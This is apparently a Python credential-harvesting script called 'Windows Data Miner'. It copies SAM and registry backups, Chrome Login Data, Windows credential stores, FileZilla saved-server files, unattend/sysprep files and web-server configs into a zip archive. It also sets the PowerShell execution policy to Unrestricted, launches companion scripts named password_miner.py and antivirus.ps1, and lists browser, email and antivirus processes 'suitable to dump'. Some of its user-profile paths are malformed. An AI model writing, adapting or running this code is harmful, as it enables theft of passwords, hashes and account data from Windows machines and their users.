import ctypes
import getpass
import os
import re
import shutil
import socket
import subprocess
import sys
import time
import uuid
import zipfile
from datetime import datetime
import psutil
import wmi


# Define the CaptureOutput class to capture output and format it for Markdown
class CaptureOutput:
    def __init__(self):
        self.output = ""

    def write(self, text):
        # Append a newline character after each message
        self.output += text + "\n"
        # Check if the message contains "ERROR:" or "WARNING:" and add Markdown for color
        if "ERROR:" in text:
            self.output = self.output.replace("ERROR:", "<span style='color:red;'>ERROR:</span>")
        elif "WARNING:" in text:
            self.output = self.output.replace("WARNING:", "<span style='color:yellow;'>WARNING:</span>")
        elif "INFO:" in text:
            self.output = self.output.replace("INFO:", "<span style='color:blue;'>INFO:</span>")
        elif "SYSTEM:" in text:
            self.output = self.output.replace("SYSTEM:", "<span style='color:green;'>SYSTEM:</span>")

    def flush(self):
        pass


# Redirect stdout and stderr to the CaptureOutput class
sys.stdout = sys.stderr = CaptureOutput()

# Constants
USER_NAME = getpass.getuser()
DESTINATION_PREFIX = "DATA\\" + USER_NAME

paths_and_name = [
    "%windir%\\repair\\sam", "SAM Backup",
    "%windir%\\System32\\config\\RegBack\\SAM", "SAM Registry Backup",
    "%windir%\\repair\\system", "System Backup",
    "%windir%\\repair\\software", "Software Backup",
    "%windir%\\repair\\security", "Security Backup",
    "%windir%\\debug\\NetSetup.log", "NetSetup Debug Log",
    "%windir%\\iis6.log", "IIS 6 Log",
    "%windir%\\system32\\logfiles\\httperr\\httperr1.log", "HTTP Error Log",
    "C:\\sysprep.inf", "Sysprep Configuration File",
    "C:\\sysprep\\sysprep.inf", "Sysprep Configuration File (Alternate)",
    "C:\\sysprep\\sysprep.xml", "Sysprep XML Configuration",
    "%windir%\\Panther\\Unattended.xml", "Unattended Windows Setup XML",
    "C:\\inetpub\\wwwroot\\Web.config", "IIS Web Configuration",
    "%windir%\\system32\\config\\AppEvent.Evt", "Application Event Log",
    "%windir%\\system32\\config\\SecEvent.Evt", "Security Event Log",
    "%windir%\\system32\\config\\default.sav", "Default Registry Backup",
    "%windir%\\system32\\config\\security.sav", "Security Registry Backup",
    "%windir%\\system32\\config\\software.sav", "Software Registry Backup",
    "%windir%\\system32\\config\\system.sav", "System Registry Backup",
    "%windir%\\system32\\inetsrv\\config\\applicationHost.config", "IIS Application Host Configuration",
    "%windir%\\system32\\inetsrv\\config\\schema\\ASPNET_schema.xml", "ASP.NET Schema XML",
    "%windir%\\System32\\drivers\\etc\\hosts", "Hosts File",
    "%windir%\\System32\\drivers\\etc\\networks", "Networks File",
    "C:\\inetpub\\logs\\LogFiles", "IIS Log Files",
    "C:\\inetpub\\wwwroot", "IIS Web Root",
    "C:\\inetpub\\wwwroot\\default.htm", "Default IIS Web Page",
    "C:\\laragon\\bin\\php\\php.ini", "Laragon PHP Configuration",
    "C:\\php\\php.ini", "PHP Configuration",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Local\\FileZilla", "FileZilla Local Data",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Local\\FileZilla\\cache.xml", "FileZilla Cache XML",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
    "Google Chrome Login Data",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat", "Windows User Class Data",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Local\\Programs\\Microsoft VS Code\\updater.log", "VS Code Updater Log",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Roaming\\Code\\User\\settings.json", "VS Code User Settings",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Roaming\\Code\\User\\workspaceStorage", "VS Code Workspace Storage",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Roaming\\FileZilla\\filezilla-server.xml",
    "FileZilla Server Configuration",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Roaming\\FileZilla\\filezilla.xml", "FileZilla Client Configuration",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Roaming\\FileZilla\\logs", "FileZilla Logs",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Roaming\\FileZilla\\recentservers.xml", "FileZilla Recent Servers",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Roaming\\FileZilla\\sitemanager.xml", "FileZilla Site Manager",
    f"C:\\Users\\{DESTINATION_PREFIX}\\AppData\\Roaming\\Microsoft\\Credentials", "Microsoft Credentials",
    "C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Outlook", "Outlook User Data",
    "C:\\Users\\{DESTINATION_PREFIX}\\NTUSER.DAT", "NT User Profile",
    "C:\\wamp\\bin\\php\\php.ini", "WAMP PHP Configuration",
    "C:\\Windows\\php.ini", "Windows PHP Configuration",
    "C:\\Windows\\System32\\config\\NTUSER.DAT", "NT User Profile (System)",
    "C:\\Windows\\System32\\drivers\\etc\\hosts", "Hosts File (System)",
    "C:\\Windows\\System32\\inetsrv\\config\\administration.config", "IIS Administration Configuration",
    "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config", "IIS Application Host Configuration (System)",
    "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.hist", "IIS Application Host History",
    "C:\\Windows\\System32\\inetsrv\\config\\monitoring\\global.xml", "IIS Monitoring Configuration",
    "C:\\Windows\\System32\\inetsrv\\config\\redirection.config", "IIS Redirection Configuration",
    "C:\\Windows\\System32\\inetsrv\\config\\schema\\applicationHost.xsd", "IIS Application Host Schema",
    "C:\\Windows\\System32\\inetsrv\\config\\schema\\ASPNET_schema.xml", "ASP.NET Schema XML (System)",
    "C:\\Windows\\System32\\inetsrv\\config\\schema\\dotnetconfig.xsd", ".NET Configuration Schema",
    "C:\\Windows\\System32\\inetsrv\\config\\schema\\IISProvider_schema.xml", "IIS Provider Schema",
    "C:\\Windows\\System32\\inetsrv\\config\\schema\\IIS_schema.xml", "IIS Schema",
    "C:\\Windows\\System32\\inetsrv\\config\\schema\\rewrite_schema.xml", "Rewrite Schema",
    "C:\\Windows\\System32\\LogFiles\\W3SVC1", "IIS Log Files (W3SVC1)",
    "C:\\Windows\\system.ini", "System Configuration",
    "C:\\xampp\\apache\\conf\\extra\\httpd-ssl.conf", "Apache SSL Configuration",
    "C:\\xampp\\apache\\conf\\extra\\httpd-vhosts.conf", "Apache Virtual Hosts Configuration",
    "C:\\xampp\\apache\\conf\\httpd.conf", "Apache HTTP Server Configuration",
    "C:\\xampp\\apache\\logs\\access.log", "Apache Access Log",
    "C:\\xampp\\apache\\logs\\php_error_log", "Apache PHP Error Log",
    "C:\\xampp\\phpMyAdmin\\config.inc.php", "phpMyAdmin Configuration",
    "C:\\xampp\\php\\php.ini", "XAMPP PHP Configuration",
    "C:\\xampp\\xampp-control.log", "XAMPP Control Log"
]


def copy_and_rename_files(paths_and_name):
    for file_path, file_name in zip(paths_and_name[::2], paths_and_name[1::2]):
        try:
            file_path = os.path.expandvars(file_path)
            if not os.path.exists(file_path):
                print(f"The file {file_path} does not exist.")
                print()
                continue

            shutil.copy2(file_path, os.getcwd())
            new_file_name = f"{USER_NAME}_{file_name}"
            new_file_path = os.path.join(os.getcwd(), new_file_name)
            if os.path.exists(new_file_path):
                os.remove(new_file_path)  # Delete the existing file
            os.rename(os.path.join(os.getcwd(), os.path.basename(file_path)), new_file_path)
            print(f"INFO: Copied and renamed file to {new_file_name}")
            print()
        except FileNotFoundError:
            print(f"ERROR: The file at path {file_path} was not found.")
            print()
        except Exception as e:
            print(f"ERROR: An error occurred: {e}")
            print()


def execute_tree_batch_file():
    # Define the name of the batch file
    batch_file_name = "tree.bat"

    # Check if the batch file exists in the current working directory
    if os.path.exists(batch_file_name):
        # Construct the command to run the batch file
        command = [batch_file_name]

        # Run the batch file and wait for it to finish
        subprocess.run(command, check=True)
        print(f"INFO: {batch_file_name} has been executed successfully.")
        print()
    else:
        print(f"ERROR: {batch_file_name} not found in the current working directory.")
        print()


def get_windows_version_info():
    # Command to get Windows version and type
    command = 'wmic os get Caption, Version'

    # Execute the command and capture the output
    result = subprocess.run(command, stdout=subprocess.PIPE, text=True, shell=True)

    # Extract the version number using the extract_version_number function
    version_number = extract_version_number(result.stdout)

    # Extract the type using regular expressions
    type_match = re.search(r'(\bHome\b|\bEnterprise\b)', result.stdout, re.IGNORECASE)
    type = type_match.group(1) if type_match else None

    # Return the version number and type
    return version_number, type


def zip_data_folder():
    # Define the source folder and the destination zip file
    source_folder = "DATA"
    destination_zip = f"{USER_NAME}_data.zip"

    # Check if the source folder exists
    if not os.path.exists(source_folder):
        print(f"ERROR: The folder {source_folder} does not exist.")
        print()
        return

    # Create a ZipFile object
    with zipfile.ZipFile(destination_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
        # Iterate over all the files in the source folder
        for root, dirs, files in os.walk(source_folder):
            for file in files:
                # Construct the full file path
                file_path = os.path.join(root, file)
                # Add the file to the zip
                zipf.write(file_path, os.path.relpath(file_path, source_folder))

    print(f"INFO: Folder {source_folder} has been zipped into {destination_zip}.")
    print()


def extract_version_number(output):
    # Adjusted regular expression pattern to match version numbers with multiple dots,
    # This pattern looks for sequences of digits separated by dots, ensuring there are at least two dots
    pattern = r'\b\d+(\.\d+){2,}\b'

    # Search for the first match of the pattern in the output
    match = re.search(pattern, output)

    # If a match is found, return the matched string (the version number)
    # Otherwise, return None
    return match.group(0) if match else None


def get_network_info():
    # Get the hostname
    hostname = socket.gethostname()

    # Get the IPv4 address
    ipv4 = socket.gethostbyname(hostname)

    # Get the IPv6 address
    ipv6 = [item[4][0] for item in socket.getaddrinfo(hostname, None, socket.AF_INET6)]

    # Get the MAC address
    # This is a workaround as Python does not provide a direct way to get the MAC address
    # We use the UUID to generate a unique identifier for the network interface
    mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8 * 6, 8)][::-1])

    return ipv4, ipv6, mac_address


def get_computer_model():
    c = wmi.WMI()
    for system in c.Win32_ComputerSystem():
        return system.Model


def execute_command(command):
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = process.communicate()
    return stdout


def execute_code(script_path):
    # Define the relative path to the PowerShell script

    # Command to run PowerShell as an administrator
    command = f'powershell.exe -Command "& {script_path}"'

    # Execute the command with administrative privileges
    # stdout=subprocess.PIPE captures the output of the script
    # shell=True is necessary to run the command as an administrator
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

    # Wait for the process to complete
    stdout, stderr = process.communicate()

    # Decode the output from bytes to string
    output = stdout.decode('utf-8')

    # Print the output
    print("INFO: ", output)
    print()


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def set_execution_policy_unrestricted():
    # Command to set the execution policy to Unrestricted
    command = "powershell.exe Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force"

    try:
        # Run the command
        subprocess.run(command, shell=True, check=True)
        print("INFO: Execution policy has been set to Unrestricted.")
        print()
    except subprocess.CalledProcessError as e:
        print(f"WARNING: Failed to set execution policy to Unrestricted. Error: {e}")
        print()


def filter_processes():
    # Define the process names to filter
    system_processes = ['System', 'smss.exe', 'wininit.exe', 'services.exe', 'csrss.exe']
    network_processes = ['svchost.exe', 'wininit.exe', 'netsh.exe', 'net.exe']
    web_browser_processes = ['chrome.exe', 'firefox.exe', 'iexplore.exe', 'msedge.exe']
    email_clients = ['outlook.exe', 'thunderbird.exe', 'microsoft-windows-live-mail.exe']
    office_processes = ['excel.exe', 'word.exe', 'powerpoint.exe', 'outlook.exe']
    antivirus_security_processes = ['msmpeng.exe']

    # Get a list of all running processes
    processes = []
    for process in psutil.process_iter(['pid', 'name']):
        try:
            # Use as_dict() to get a dictionary representation of the process
            pinfo = process.as_dict(attrs=['pid', 'name'])
            processes.append(pinfo)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

    # Filter and print the list of processes
    for p in processes:
        if p['name'] in system_processes or p['name'] in network_processes or p['name'] in web_browser_processes or p[
                'name'] in email_clients or p['name'] in office_processes or p['name'] in antivirus_security_processes:
            print(f"INFO: PID = {p['pid']}, Program Name = {p['name']}")
            print()


def process_files():
    # Define the current working directory and the DATA directory
    current_dir = os.getcwd()
    data_dir = os.path.join(current_dir, 'DATA')

    # Ensure the DATA directory exists, if not, create it
    if not os.path.exists(data_dir):
        os.makedirs(data_dir)

    # List all items in the current directory
    items = os.listdir(current_dir)

    # Filter items that are files with.txt,.file extensions or no extension
    target_files = [item for item in items if
                    item.endswith('.txt') or item.endswith('.file') or not os.path.splitext(item)[1]]

    if target_files:
        print(f"INFO: Found {len(target_files)} files to process.")
        print()
        for item in target_files:
            # Construct the full path to the item
            item_path = os.path.join(current_dir, item)

            # Check if the item is a file before attempting to copy
            if os.path.isfile(item_path):
                # Copy the file to the DATA directory
                shutil.copy(item_path, data_dir)

                # Delete the original file
                os.remove(item_path)

                print(f"INFO: Processed {item}, copied to {data_dir} and deleted.")
                print()
            else:
                print(f"INFO: Skipping {item} as it is not a file (it might be a directory).")
                print()
    else:
        print("WARNING: No.txt,.file files or files without extensions found in the current directory.")
        print()


def empty_data_folder():
    # Get the current working directory
    current_dir = os.getcwd()

    # Define the folder name to search for
    folder_name = "DATA"

    # Construct the path to the folder
    folder_path = os.path.join(current_dir, folder_name)

    # Check if the folder exists
    if os.path.exists(folder_path):
        # Check if the folder is a directory
        if os.path.isdir(folder_path):
            # List all files and directories in the folder
            for item in os.listdir(folder_path):
                # Construct the full path to the item
                item_path = os.path.join(folder_path, item)

                # Check if the item is a file or directory
                if os.path.isfile(item_path):
                    # Remove the file
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    # Remove the directory and its contents
                    shutil.rmtree(item_path)

    else:
        print(f"ERROR: The folder '{folder_name}' does not exist in the current working directory.")


def get_current_datetime():
    # Get the current date and time
    now = datetime.now()

    # Format the date and time
    formatted_now = now.strftime("%Y-%m-%d %H:%M:%S")

    return formatted_now


def capture_and_save_output():
    try:
        # Get the username of the current user
        username = getpass.getuser()

        # Create a new Markdown file in the working directory named after the user
        filename = f"{username}_log.md"
        with open(filename, "w") as file:
            # Write the captured output to the file
            # Markdown formatting can be added here if needed
            file.write(sys.stdout.output)

        print(f"INFO: Log file '{filename}' has been created successfully.")
    except Exception as e:
        print(f"ERROR: Failed to create log file. Error: {e}")


def main():
    current_datetime = get_current_datetime()
    print("**Windows Data Miner**")
    print()
    print("SYSTEM: Project Start: ", current_datetime)
    print()
    if is_admin():
        print("SYSTEM: code.py is running with administrative privileges.")
        print()
    else:
        print("WARNING: code.py is running without administrative privileges.")
        print()
        print("WARNING: This may cause errors")
        print()

    ipv4, ipv6, mac_address = get_network_info()
    version_number, type = get_windows_version_info()

    # Directly execute each operation
    execute_tree_batch_file()
    copy_and_rename_files(paths_and_name)
    execute_code("./dataminer.ps1")
    execute_code("./antivirus.ps1")
    execute_code("./password_miner.py")
    execute_code("./private_data.py")
    print(f"INFO: Raw Processes Running Suitable to dump:- {filter_processes()}")
    print()
    print(f"INFO: Computer Model: {get_computer_model()}")
    print()
    print("INFO: CPU", execute_command('wmic cpu get Name').splitlines()[2].strip())
    print()
    print("INFO: GPU", execute_command('wmic path win32_VideoController get Name').splitlines()[2].strip())
    print()
    print("INFO: RAM",
          execute_command('wmic MEMORYCHIP get BankLabel, Capacity, MemoryType').splitlines()[2].strip())
    print()
    print("INFO: SSD", execute_command('wmic diskdrive get Model, MediaType, Size').splitlines()[2].strip())
    print()
    print(f"INFO: Windows Version Number: {version_number}")
    print()
    print(f"INFO: Windows Type: {type}")
    print()
    print(f"INFO: IPv4: {ipv4}")
    print()
    print(f"INFO: IPv6: {ipv6}")
    print()
    print(f"INFO: MAC Address: {mac_address}")
    print()
    time.sleep(3)
    process_files()
    time.sleep(6)
    zip_data_folder()
    print("INFO: Finished, Closing in 50 seconds...")
    print()
    empty_data_folder()
    current_datetime = get_current_datetime()
    print("SYSTEM: Project Complete: ", current_datetime)
    print()
    time.sleep(25)


if __name__ == "__main__":
    set_execution_policy_unrestricted()
    main()
    capture_and_save_output()
    time.sleep(25)
